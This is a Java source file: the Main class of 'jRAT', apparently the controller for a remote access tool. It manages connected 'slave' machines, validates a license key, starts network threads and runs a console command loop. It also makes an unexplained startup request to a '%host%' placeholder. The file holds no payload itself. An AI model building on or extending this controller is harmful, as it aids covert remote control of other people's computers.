package se.jrat.controller;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStreamReader;
import java.text.DateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;

import javax.swing.JOptionPane;
import javax.swing.UIManager;

import jrat.api.commands.Commands;
import se.jrat.common.Logger;
import se.jrat.common.Version;
import se.jrat.common.utils.Utils;
import se.jrat.controller.addons.Plugins;
import se.jrat.controller.commands.DefaultCommands;
import se.jrat.controller.net.WebRequest;
import se.jrat.controller.settings.AbstractStoreable;
import se.jrat.controller.settings.Settings;
import se.jrat.controller.settings.SettingsColumns;
import se.jrat.controller.settings.SettingsTheme;
import se.jrat.controller.settings.StatisticsCountry;
import se.jrat.controller.threads.NetworkCounter;
import se.jrat.controller.threads.RunnableCheckPlugins;
import se.jrat.controller.threads.ThreadCheckVersion;
import se.jrat.controller.threads.ThreadPing;
import se.jrat.controller.threads.ThreadTransferSpeed;
import se.jrat.controller.ui.dialogs.DialogEula;
import se.jrat.controller.ui.frames.Frame;
import se.jrat.controller.utils.TrayIconUtils;

import com.redpois0n.oslib.OperatingSystem;

public class Main {
	
	public static final long START_TIME = System.currentTimeMillis();

	public static boolean liteVersion = true;
	public static boolean debug;
	public static boolean hideTitle;

	public static final List<AbstractSlave> connections = new ArrayList<AbstractSlave>();
	public static Frame instance;

	public static void main(String[] args) throws Exception {	
		System.out.println("jRAT " + Version.getVersion() + " " + DateFormat.getDateInstance(DateFormat.SHORT).format(new Date()));
		
		debug = argsContains(args, "--debug");

		Main.debug("Loading libraries...");
		try {
			Plugins.loadLibs();
		} catch (Exception e) {
			e.printStackTrace();
		}
		
		try {
			WebRequest.getUrl("%host%", true);
		} catch (Exception e) {
			e.printStackTrace();
		}

		if (argsContains(args, "--genkey")) {
			Logger.log("Generating key");
			File file = Globals.getKeyFile();
			FileOutputStream out = new FileOutputStream(file);
			out.write(UniqueId.generateBinary());
			out.close();
			Logger.log("Wrote key to " + file.getAbsolutePath());
			System.exit(0);
		}

		hideTitle = argsContains(args, "--hidetitle");

		if (OperatingSystem.getOperatingSystem().getType() == OperatingSystem.OSX) {
			if (!argsContains(args, "--nomenubar")) {
				System.setProperty("apple.laf.useScreenMenuBar", "true");
			}
			
			System.setProperty("com.apple.mrj.application.apple.menu.about.name", Constants.NAME);
		}
		
		Globals.mkdirs();

		try {
			SettingsTheme.getGlobal().load();
			UIManager.setLookAndFeel(SettingsTheme.getGlobal().getTheme());
		} catch (Exception ex) {
			Main.debug("Could not use LAF " + SettingsTheme.getGlobal().getTheme() + ", setting default system LAF");
			ex.printStackTrace();
			UIManager.setLookAndFeel(UIManager.getSystemLookAndFeelClassName());
		}
		
		try {
			boolean validated = UniqueId.validate(argsContains(args, "--showhexkey"));

			if (validated) {
				liteVersion = false;
			}
		} catch (Exception ex) {
			ex.printStackTrace();
			
			if (!debug) {
				JOptionPane.showMessageDialog(null, Constants.NAME + " is limited, no license detected", Constants.NAME, JOptionPane.ERROR_MESSAGE);
			}
		}

		System.setProperty("jrat.version", Version.getVersion());

		try {
			Plugins.init();
		} catch (Exception e) {
			e.printStackTrace();
		}

		StatisticsCountry.getGlobal().load();
		Settings.getGlobal().load();	
		SettingsColumns.getGlobal().load();
		
		boolean headless = argsContains(args, "-h", "--headless") || Utils.isHeadless();
		
		if (!headless) {
			instance = new Frame();
			instance.setVisible(true);
		}

		AbstractStoreable.loadAllGlobals();

		boolean showEULA = Settings.getGlobal().getBoolean("showeula");
		if (!showEULA) {
			DialogEula frame = new DialogEula(false);
			frame.setVisible(true);
		}

		Main.debug("Starting threads...");
		new Thread(new NetworkCounter()).start();
		new ThreadCheckVersion().start();
		new Thread(new RunnableCheckPlugins()).start();
		new ThreadPing().start();
		new ThreadTransferSpeed().start();


		Main.debug("Loading tray icon...");
		TrayIconUtils.initialize();

		Runtime.getRuntime().addShutdownHook(new Thread(new ShutdownHook()));

		DefaultCommands.addDefault();

		BufferedReader reader = new BufferedReader(new InputStreamReader(System.in));
		String s;

		while ((s = reader.readLine()) != null) {
			Commands.execute(s, System.out);
		}
	}

	public static boolean argsContains(String[] args, String... keys) {
		for (String str : args) {
			for (String key : keys) {
				if (str.equalsIgnoreCase(key)) {
					return true;
				}
			}
		}

		return false;
	}

	public static String getArg(String[] args, String... keys) {
		for (int i = 0; i < args.length; i++) {
			for (String key : keys) {
				if (args[i].equalsIgnoreCase(key)) {
					return args[i + 1];
				}
			}
		}

		return null;
	}

	public static String debug(Object s) {
		if (s == null) {
			s = "null";
		}
		
		if (debug) {
			Logger.log(s.toString());
		}
		
		return s.toString();
	}

	public static String formatTitle() {
		if (hideTitle) {
			return Constants.NAME;
		}
		
		String suffix = liteVersion && !debug ? "Limited" : "";

		return Constants.NAME + " [" + connections.size() + "] " + Version.getVersion() + " " + suffix;
	}
	
	public static boolean isFeatureEnabled() {
		return Main.debug || !Main.liteVersion;
	}

}
